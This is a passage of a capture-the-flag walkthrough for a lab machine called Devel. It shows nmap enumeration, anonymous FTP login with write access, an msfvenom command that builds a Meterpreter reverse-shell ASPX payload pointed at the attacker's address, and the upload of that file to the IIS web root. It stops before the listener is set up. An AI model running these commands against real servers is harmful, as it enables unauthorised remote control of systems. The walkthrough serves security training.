## Devel Walkthrough

Devel is a machine that shows how easily a bad-actor can exploit an FTP server with anonymous log-ins allowed.

![Devel (1)](https://user-images.githubusercontent.com/126024971/222150125-691ed746-8105-4885-94eb-647374b40494.png)

---

### Enumeration

IP Address: 10.129.237.99

Start with an namp scan of the target.

`nmap -T4 -A 10.129.237.99`

The scan found two ports:

Port 21 - An FTP server

Port 80 - IIS

![image](https://user-images.githubusercontent.com/126024971/222151820-50bce772-b532-421e-ab4f-71cae41803af.png)

Interestingly, the FTP server allows for anonymous logins. And since IIS is running, this is also a web server.

First, let's check out FTP. You can log into the server with this command:

`ftp 10.129.237.99`

After this you will be prompted for a username, since anonymous login is allowed you can use the anonymous user. When you are prompted for a password, just hit enter and you will be logged into the machine.

![image](https://user-images.githubusercontent.com/126024971/222153347-1dc0a197-6b4c-4c55-b9cf-a7e13a6cc172.png)

We get read/write permisions with the anonymous account. However, we need more information before going further. Navigate to the web server in a browser (be sure to point to port 80). We just the the default IIS splash screen.

![image](https://user-images.githubusercontent.com/126024971/222153829-5868d5f6-9e9f-40f6-a594-0b9f1de54e84.png)

Since Devel is running IIS in conjunction with the FTP server that we have write permissions to, we can inject an ASPX file. ASPX (Active Server Page Extended) files use scripts to coordinate how a web page behaves. We can use this to our advantage by dropping an ASPX file into the target that provides a reverse shell. To create a ASPX reverse shell file, use this command:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR-IP-ADDRESS LPORT=4444 -f aspx >devel.aspx`

![Screenshot_20230227_023441](https://user-images.githubusercontent.com/126024971/222156199-b4dcd2e0-9895-42f4-af11-d61c4fdbe221.png)

You can run an `ls` command to confirm that the ASPX file is in your current directory:

![Screenshot_20230227_023505](https://user-images.githubusercontent.com/126024971/222156623-5e2d6a66-ed50-4ab6-9ca2-9cd628ae66cd.png)

Now we need to copy the ASPX file onto the FTP server (make sure you are loggged onto the FTP server when running this command).

`put devel.aspx` 

![Screenshot_20230227_023704](https://user-images.githubusercontent.com/126024971/222157080-19a7e454-7414-4ed9-9b00-fab2fe2131b2.png)

Now that the ASPX file is on devel, we need to set up a listening service for the reverse shell to talk to once the ASPX file is ran.There are many ways of doing this, but I like using the multi handler in Metasploit.
